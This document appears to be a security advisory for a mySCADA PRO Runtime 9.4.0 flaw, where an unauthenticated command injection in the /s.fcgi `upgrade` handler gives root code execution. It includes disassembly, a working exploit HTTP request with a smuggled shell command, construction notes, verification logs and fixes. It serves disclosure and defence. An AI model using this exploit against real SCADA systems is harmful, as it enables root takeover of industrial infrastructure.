# mySCADA PRO Runtime 9.4.0 — Unauthenticated `upgrade` Branch Command Injection → Root RCE

## 1. Overview

mySCADA PRO Runtime is a closed-source SCADA/HMI runtime used in industrial automation, water treatment, energy, and building automation. In version 9.4.0 it is deployed as an OCI container (`msxrun`, Ubuntu 24.04) running with `USER root`, fronted by an nginx HMI on ports 80/443. The native FastCGI binary `myscadagate` (running as root) contains an OS command injection in its `upgrade` branch: `system("chmod 777 " + <attacker-controlled string>)`.

The route `/s.fcgi` is proxied directly to `myscadagate` without the `auth_request /auth` gate applied to other routes, so the sink is reachable unauthenticated. A patch-diff of CVE-2025-20014/20061 (which fixed the `version` and `email` branches of the same binary) shows the `upgrade` branch was left vulnerable with the same sink pattern.

## 2. Vulnerability Summary

- **Type**: Unauthenticated OS command injection → root RCE
- **Root cause 1 (CWE-78)**: `system("chmod 777 %s")` with an attacker-controlled suffix built from `QUERY_STRING`
- **Root cause 2 (CWE-306/CWE-863)**: the `/s.fcgi` nginx route bypasses `auth_request`, making the sink reachable without authentication
- **Root cause 3 (CWE-284)**: the container runs as root, so the injected command executes with uid 0
- **Filter gap**: `checkFileName` blocks only `\`, `/`, and `..`; shell metacharacters (`;`, `>`, `|`, `&`, spaces) are permitted
- **Result**: unauthenticated remote attacker executes arbitrary commands as root. CVSS 9.4.

## 3. Authentication Boundary

The nginx HMI (`myscadahmi`) protects most routes with `auth_request /auth` (backend `myAuth:11039`); for example `GET /gensec` and `GET /data/0` return 401 without a session. However, the `/s.fcgi` location is configured with `fastcgi_pass 127.0.0.1:11031` directly to `myscadagate` and is **not** protected by `auth_request`:

```
GET /s.fcgi  → 200 "OK"   (unauthenticated, reachable)
GET /gensec  → 401        (auth_request enforced — contrast)
GET /data/0  → 401        (auth_request enforced — contrast)
```

The `myscadagate` binary itself does not implement its own authentication for the `upgrade` branch; `REQUEST_URI` must equal `/s.fcgi` (satisfied by the nginx location) and `CONTENT_LENGTH` must be greater than 0 (any non-empty body with `Content-Length: 1`).

## 4. Attack Surface

- **Entry**: `POST /s.fcgi?upgrade=<payload>` (unauthenticated)
- **Controllable parameters**: `QUERY_STRING` (via `upgrade=`), `HTTP_X_FILE` header (rename source path), request body
- **Hard gates**: `REQUEST_URI == "/s.fcgi"`; `atoi(CONTENT_LENGTH) > 0`
- **Sink precondition**: `rename(source, dest)` must return 0; satisfied when `X-File` points to an existing directory (`/opt/myscada/fw/test` exists by default)

## 5. Sink Identification

`r2ghidra`/radare2 disassembly of `sym.fcgi_run__` shows the sink:

```
0x1de26  call sym.imp.system     ; ★RCE SINK★ (cpp:4197)
0x1ddef  ... snprintf "chmod 777 %s"  (format @0x1dddb, "chmod 777 " @0x79f28)
```

The sink is `system("chmod 777 " + <attacker-controlled string>)` — the same pattern as CVE-2025-20014/20061. `snprintf` builds the command at `0x1ddef` and `system()` executes it at `0x1de26`.

## 6. Source Identification & Controllability

The attacker-controlled string reaches the sink through:

```
0x197b0  call FCGX_GetParam "QUERY_STRING"   ; ★SOURCE★
0x19b53  call split                          ; vector = split(QUERY_STRING, "=")
0x1dc30  call checkFileName                  ; vector[1] passed to filter
0x1dc75  vector::at(1) → rdx
0x1dc8e  operator+                           ; var_1040h = fw_dir + vector[1]
0x1ddef  snprintf(buf, "chmod 777 %s", var_830h.c_str())
0x1de26  system(buf)                         ; ★RCE★
```

`fw_dir` is a global initialized in `main` via `get_full_path(prefix, "fw/")` — `/opt/myscada/fw/` in the verified environment. The `HTTP_X_FILE` header feeds `var_19b0h` (the rename source) and is used verbatim without URL-decoding.

The filter (`checkFileName`, cpp:689-700):

```c
int checkFileName(string &s) {
    if (s.find('\\') != string::npos) return 1;  // 0x7737f
    if (s.find('/')  != string::npos) return 1;  // 0x77381
    if (s.find("..") != string::npos) return 1;  // 0x77383
    return 0;
}
```

Only `\`, `/`, and `..` are blocked. `;`, `>`, `$`, `|`, `&`, and spaces are not, so `;id>tmp_marker` passes the filter.

## 7. Data Flow

```
Attacker
  │
  ├─POST /s.fcgi?upgrade=<urlenc(";id > tmp_marker ; mkdir tmp_rce")>
  │   Content-Length: 1 · X-File: /opt/myscada/fw/test
  │
  ├─nginx location /s.fcgi (no auth_request) → fastcgi_pass 127.0.0.1:11031
  │
  ├─myscadagate:
  │   0x1dae4 remove(X-File)             → EISDIR for directory, not deleted
  │   0x1db19 vector[0].compare("upgrade") → branch match
  │   0x1dc30 checkFileName(vector[1])   → passes (no \ / ..)
  │   0x1dc8e var_1040h = fw_dir + vector[1]   → /opt/myscada/fw/;id > tmp_marker ; mkdir tmp_rce
  │   0x1dd73 rename(X-File dir, dest)   → returns 0 (dir → non-existent dest)
  │   0x1ddef snprintf("chmod 777 %s", dest)
  │   0x1de26 system(buf)
  │
  └─executed as root (uid 0):
       chmod 777 /opt/myscada/fw/   (fails, ; separates)
       id > tmp_marker              (RCE, CWD=/ → /tmp_marker)
       mkdir tmp_rce                (persistence staging)
```

## 8. Exploit Construction

The working payload is a single HTTP request:

```http
POST /s.fcgi?upgrade=%3Bid%3Etmp_marker HTTP/1.1
Content-Length: 1
X-File: /opt/myscada/fw/test

x
```

Which executes:

```bash
system("chmod 777 /opt/myscada/fw/;id > tmp_marker")
```

Construction notes:

- The `X-File` value must be an **existing directory** so that `remove()` fails with EISDIR (leaving the source intact) and `rename(dir, dest)` succeeds (returns 0) — unlocking the `system()` call.
- nginx temp directories (`fastcgi_temp` etc.) must be avoided because nginx buffers the current FastCGI response there; renaming them hangs the response. The default `/opt/myscada/fw/test` directory is safe.
- The exploit script (`myscada_unauth_upgrade_rce.py`) automates request construction and supports a `--xfile` option to reuse the persisted `/tmp_rce` directory.

## 9. Dynamic Verification

All runs executed on the container host (ports loopback-only for research safety):

Run 1 (`id`):

```
$ python3 02-exploit.py 127.0.0.1 19080 "id"
[+] HTTP status: 200
[+] response body: OK
$ docker exec msxrun cat /tmp_marker
uid=0(root) gid=0(root) groups=0(root)
```

Run 2 (`whoami`, persistence via `--xfile /tmp_rce`):

```
$ docker exec msxrun cat /tmp_marker
root
```

Run 3 (`uname -a`):

```
$ docker exec msxrun cat /tmp_marker
Linux ce14b9a0ef14 5.10.134-19.2.al8.x86_64 ... x86_64 GNU/Linux
```

Each run returned HTTP 200 and the marker changed with the requested command, proving arbitrary command execution as root.

## 10. Reachability & Impact

- **Reachability**: `/s.fcgi` is reachable over the public-facing nginx (ports 80/443, bound 0.0.0.0 in production) with no authentication; all preconditions hold on a default installation.
- **Impact**: arbitrary root command execution on the SCADA runtime container/host, including process data theft, configuration tampering, and disruption of industrial monitoring. The container runs as root and the `upgrade` branch is part of firmware-upgrade handling, giving the attacker a legitimate-looking path to modify runtime binaries.
- **Scope**: mySCADA PRO Runtime deployments across industrial facilities (water, energy, manufacturing, buildings).

## 11. Fix Recommendations

1. Whitelist `checkFileName` to `[A-Za-z0-9_.-]`; reject every shell metacharacter.
2. Replace the shell-based `system("chmod 777 %s")` with a direct `chmod(path, 0777)` syscall.
3. Add `auth_request /auth` to the `/s.fcgi` nginx route.
4. Run `myscadagate` as a non-root user inside the container.
5. Apply a complete patch-diff pass over all `system`/`popen` sinks in `fcgi_run__`, not just the `version`/`email` branches fixed in 9.2.1.

## 12. CWE & CVSS

- **CWE-78**: Improper Neutralization of Special Elements used in an OS Command (command injection)
- **CWE-306**: Missing Authentication for Critical Function (`/s.fcgi` bypasses `auth_request`)
- **CWE-284**: Improper Access Control / excessive privileges (container runs as root)
- **CVSS**: 9.4 Critical — CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
